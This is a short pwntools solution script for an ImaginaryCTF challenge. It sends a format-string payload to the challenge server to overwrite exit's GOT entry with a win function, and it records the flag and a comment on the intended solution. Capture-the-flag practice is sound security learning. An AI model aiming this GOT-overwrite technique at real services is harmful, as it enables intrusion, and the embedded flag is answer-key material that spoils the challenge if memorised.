from pwn import *

context.arch = "amd64"

elf = ELF("./vuln")
# io = process("./vuln")
io = remote("puzzler7.imaginaryctf.org", 1016)
io.sendline(fmtstr_payload(6, {elf.got["exit"]: elf.sym["win"]}))
io.interactive()
# ictf{imagine_filtering_19b22d99}


# intended
# %1n works, the main goal of this chall was to get you to not use pwntools fmtstr_payload
